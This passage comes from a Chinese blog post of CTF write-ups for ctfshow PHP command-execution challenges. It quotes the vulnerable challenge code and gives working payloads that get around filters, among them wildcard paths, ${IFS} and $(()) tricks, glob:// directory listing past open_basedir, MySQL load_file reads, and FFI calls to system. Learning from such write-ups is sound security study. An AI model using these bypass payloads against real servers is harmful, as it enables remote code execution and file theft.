class="string">&quot;file&quot;</span>: (<span class="string">&#x27;feng.txt&#x27;</span>, <span class="string">b&#x27;cat flag.php&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">if</span> r.text.find(<span class="string">&quot;flag&quot;</span>) &gt;<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>2、使用/bin这个目录：<br>       bin为binary的简写主要放置一些 系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等<br>       这题利用/bin/base64<br>base64这个命令就是将指定的文件的内容以base64加密的形式输出。<br>因为过滤了字母，正好可以用64来匹配，最终payload如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/???/????<span class="number">64</span> ????????</span><br></pre></td></tr></table></figure>

<h2 id="web-54"><a href="#web-54" class="headerlink" title="web 54"></a>web 54</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Lazzaro</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-05 20:49:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-07 19:43:42</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>题目如上；<br>同55一样运用/bin目录</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由于/bin上拥有cat，因此用/bin/cat flag.php;便可查找flag。</span><br></pre></td></tr></table></figure>

<p>由于cat flag . php 被过滤则<br>使用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/bin/ca?$&#123;IFS&#125;f???????</span><br></pre></td></tr></table></figure>

<h2 id="web-57"><a href="#web-57" class="headerlink" title="web 57"></a>web 57</h2><p>disable_functions函数启动后会禁止一些函数使得一些命令无法使用。<br>又是新姿势，知识点是$(( ))与整数运算。想办法构造出36.<br>双小括号的作用：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">  双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。</span><br><span class="line">通俗地讲，就是将数学运算表达式放在((和))之间。</span><br><span class="line"></span><br><span class="line">表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。</span><br><span class="line"></span><br><span class="line">可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。</span><br><span class="line"></span><br><span class="line">可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c=$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。</span><br></pre></td></tr></table></figure>
<p>大佬曾说：关于取反，根据我学习下来得到的经验就是如果b=<del>a，那么a+b=-1<br>注意：$(())的值是0。$((</del>$(())))的值是-1。$((     $((<del>$(())))       $((</del>$(())))        ))  是-2;<br>则我们可以看出来<br>-2的构成是由两个-1相加得来的且内部也是默认相加；（因此36则需要-37来取反 //说实话没看懂；）<br>因此则需要三十七个$((<del>$(()))) ，之后在取反，取反看大佬说是$((</del>$(( ))))。<br>因此：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$((~$((     $((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))        ))))</span><br></pre></td></tr></table></figure>

<h2 id="web-58-65"><a href="#web-58-65" class="headerlink" title="web 58~65"></a>web 58~65</h2><p>  读文件的函数有这些：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents()</span><br><span class="line">highlight_file()</span><br><span class="line">show_source()</span><br><span class="line">fgets()</span><br><span class="line">file()</span><br><span class="line">readfile()</span><br></pre></td></tr></table></figure>
<p>fgets()函数使用：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  c=</span><br><span class="line"><span class="variable">$a</span>=fopen(<span class="string">&quot;flag.php&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$b</span>=fgets(<span class="variable">$a</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>之后蚁剑连接。（我也不知道是什么情况😂）</p>
<h2 id="web-66"><a href="#web-66" class="headerlink" title="web 66"></a>web 66</h2><p>（该题的flag在根目录下，html下的flag.php是假的）我们看到假的后可以用下面方法打开。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line">highlight_file(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web-67"><a href="#web-67" class="headerlink" title="web 67"></a>web 67</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本题的print_r（）被禁</span><br><span class="line">可以用var_dump()来绕过。</span><br></pre></td></tr></table></figure>

<h2 id="web-68"><a href="#web-68" class="headerlink" title="web 68"></a>web 68</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">highlight_file()被过滤，但是<span class="keyword">include</span>却没有被ban因此可以用文件包含。</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web-69-70"><a href="#web-69-70" class="headerlink" title="web 69~70"></a>web 69~70</h2><p>如果var_dump被ban就使用var_export()来绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web-70"><a href="#web-70" class="headerlink" title="web 70"></a>web 70</h2><p>题目源码（在附件中）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="comment">// 你们在炫技吗？</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$c</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$s</span> = ob_get_contents();<span class="comment">////得到缓冲区的数据</span></span><br><span class="line">        ob_end_clean();<span class="comment">//会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容</span></span><br><span class="line">        <span class="keyword">echo</span> preg_replace(<span class="string">&quot;/[0-9]|[a-z]/i&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="variable">$s</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
<p>（缓冲区：缓冲区又称为缓存，它是内存空间的一部分。<br>也就是说，在内存空间中预留了一定的存储空间，这些存储空间用来缓冲输入或输出的数据，这部分预留的空间就叫做缓冲区。<br>   缓冲区根据其对应的是输入设备还是输出设备，分为输入缓冲区和输出缓冲区。<br>    比如我们从磁盘里取信息，我们先把读出的数据放在缓冲区，<br>计算机再直接从缓冲区中取数据，等缓冲区的数据取完后再去磁盘中读取，<br>这样就可以减少磁盘的读写次数，<br>再加上计算机对缓冲区的操作大大快于对磁盘的操作，故应用缓冲区可大大提高计算机的运行速度。）<br><strong>本题是在我们输入命令后输出时对输出数据先进行缓存，缓存的数据通过preg_replace()将字母和数字都给替换为？，使得我们无法正常查看。</strong><br>使用exit()/die()提前结束，这样就不会将字符替换为问号（在我看来，应该是没有进行下面的得到缓存区数据的代码）</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=var_export(scandir(<span class="string">&#x27;/&#x27;</span>));<span class="keyword">exit</span>();</span><br><span class="line">c=<span class="keyword">include</span>(<span class="string">&#x27;/flag.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
<p>web72 不会</p>
<h2 id="web-73、74"><a href="#web-73、74" class="headerlink" title="web 73、74"></a>web 73、74</h2><p>无源码，可根据71、72来做。<br>其他大佬都说存在open_basedir函数，因此可以利用glob伪协议来筛选目录。<br>glob伪协议：glob:// — 查找匹配的文件路径模式<br>本题代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">    &#125; </span><br><span class="line">   <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>之后可以查找到flagc.txt文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;/flagc.txt&#x27;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>
<p>即可得到。</p>
<h2 id="web-75-76"><a href="#web-75-76" class="headerlink" title="web 75~76"></a>web 75~76</h2><p>和上题一样，通过上题脚本可以看到flag实在flag36.txt中，但之后是由include()函数去报错，之后发现是open_basedir影响使得路径受到限制，不懂,看到大佬wp发现：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">c=</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;root&#x27;</span>);<span class="comment">//连接数据库</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="variable">$row</span>[<span class="number">0</span>]) . <span class="string">&quot;|&quot;</span>;<span class="comment">//query()执行查询语句，返回结果集对象，从中可以看出该段代码是将flag36.txt内容传到$row中，并输出。</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;<span class="comment">//回显错误信息。</span></span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//PDOException是错误异常。</span></span><br></pre></td></tr></table></figure>
<p>大师傅们说数据库的连接是读配置文件得到的。至于配置文件在哪。。鬼知道。。。<br>不过这种拿SQL语句来读文件绕过open_basedir和disable_function的姿势实在是第一次见，学到了学到了。</p>
<p>PDO<br>PDO()就是PHP data Object 提供了PHP操作多种数据库的统一的接口,使用的主要思路：<br>1、添加<br>      （1）连接数据库、数据库的用户名、数据库的密码<br>                                         （2）生成PDO对象<br>                                         （3）执行添加 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf8&#x27;</span>);</span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&quot;mysql:dbname=test;host=127.0.0.1&quot;</span>;</span><br><span class="line"><span class="comment">//数据库的用户名</span></span><br><span class="line"><span class="variable">$user</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">//数据库的密码</span></span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="comment">//生成PDO对象</span></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> PDO(<span class="variable">$dsn</span>,<span class="variable">$user</span>,<span class="variable">$password</span>);</span><br><span class="line"><span class="comment">//执行添加</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;insert into student(`name`,`sex`,`sex`) values(&#x27;zhangsan&#x27;,&#x27;男&#x27;,&#x27;18&#x27;)&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$object</span>-&gt;exec(<span class="variable">$sql</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;添加成功&#x27;</span>;</span><br><span class="line">&#125;<span class="comment">//exec主要用于执行没有返回结果集的操作，比如insert、delete、update，返回的是影响的记录条数</span></span><br></pre></td></tr></table></figure>
<p>2、查询<br> 主要思路：<br>                                         （1）连接数据库、数据库的用户名、数据库的密码<br>                                         （2）生成PDO对象<br>                                         （3）执行查询 </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;content-type:text/html;charset=utf8&#x27;</span>);</span><br><span class="line"><span class="comment">//连接数据库</span></span><br><span class="line"><span class="variable">$dsn</span>=<span class="string">&quot;mysql:dbname=test;host=127.0.0.1&quot;</span>;</span><br><span class="line"><span class="comment">//数据库的用户名</span></span><br><span class="line"><span class="variable">$user</span>=<span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="comment">//数据库的密码</span></span><br><span class="line"><span class="variable">$password</span>=<span class="string">&quot;123456&quot;</span>;</span><br><span class="line"><span class="comment">//生成PDO对象</span></span><br><span class="line"><span class="variable">$object</span> = <span class="keyword">new</span> PDO(<span class="variable">$dsn</span>,<span class="variable">$user</span>,<span class="variable">$password</span>);</span><br><span class="line"> </span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select * from student&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$object</span>-&gt;query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$arr</span>=<span class="variable">$result</span>-&gt;fetch())&#123;</span><br><span class="line">    print_r(<span class="variable">$arr</span>);</span><br><span class="line">&#125;<span class="comment">//用循环利用fetch()方法逐个的取出记录，返回的是关联数组和索引数组两种数组，和mysql_fetch_array()的返回结果一致</span></span><br></pre></td></tr></table></figure>
<p>还可以</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span>=<span class="variable">$result</span>-&gt;fetchAll();<span class="comment">//fetchAll()方法可以一次取出结果集中所有的数组，以二维数组的形式返回，但仍然是关联数组和索引数组两种数组</span></span><br><span class="line">print_r(<span class="variable">$student_info</span>);</span><br></pre></td></tr></table></figure>

<h2 id="web-77"><a href="#web-77" class="headerlink" title="web 77"></a>web 77</h2><p>通过该题，我们可以在开始的提示中看到PHP7.4，从而可以想到FFI（虽然我也不知道如何想到的，但我们应该知道FFI为PHP7.4核心拓展。</p>
<blockquote>
<p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</p>
</blockquote>
<p>通过FFI，可以实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后访问这个文本文件，获得flag。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首先是熟悉的确定flag位置和名称</span></span><br><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>); </span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>) </span><br><span class="line">	&#123; </span><br><span class="line">		<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27;  &#x27;</span>);</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">exit</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//FFI调用system函数</span></span><br><span class="line">c=</span><br><span class="line"><span class="variable">$ffi</span>=FFI :: cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="WEB118"><a href="#WEB118" class="headerlink" title="WEB118"></a>WEB118</h2><p>拿到题一脸懵，不知道该干啥，看源码知道?code，看大佬wp发现好东西</p>
<blockquote>
<p>root@baba:<del># echo ${PWD}<br>/root<br>root@baba:</del># echo ${PWD:1:1}   //表示从第2（1+1）个字符开始的一个字符<br>r<br>root@baba:<del># echo ${PWD:0:1}   //表示从第1（0+1）个字符开始的一个字符<br>/<br>root@baba:</del># echo ${PWD:<del>0:1}  //表示从最后一个字符开始的一个字符<br>t<br>root@baba:</del># echo ${PWD:~A}    //字母代表0<br>t</p>
</blockquote>
<p>利用各种环境变量来构造命令<br>首先需要知道${PWD}：看当前路径<br>${PATH}通常为bin<br>通过上面的规则来构造命令（若看不懂可以看Linux 基础知识：Bash的内置变量<br>常见 Bash 内置变量介绍）<br>由于通配符没有被过滤，则构造</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br><span class="line"><span class="comment">//在看源码就可以看到flag</span></span><br></pre></td></tr></table></figure>

<h2 id="web119-120"><a href="#web119-120" class="headerlink" title="web119~120"></a>web119~120</h2><p>比上题多过滤了path。</p>
<blockquote>
<p>SHLVL：是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时${SHLVL}=1，然后在此shell中再打开一个shell时$SHLVL=2。<br>RANDOM：此变量值，随机出现整数，范围为0-32767。不过，虽然说是随机，但并不是真正的随机，因为每次得到的随机数都一样。为此，在使用RANDOM变量前，请随意设定一个数字给RANDOM，当做随机数种子，这样才不会每次产生的随机数其顺序都一样。<br>在Linux中，$或$</p>
</blockquote>
</div><hr></div><nav id="pagination"><div class="pagination"><a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-chevron-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://cdn.eso.org/images/screen/eso0932a.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2013 - 2022 By John Doe</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script src="/js/search/local-search.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="local-search"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts"></div></div></div><hr><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>Powered by</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a></div></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>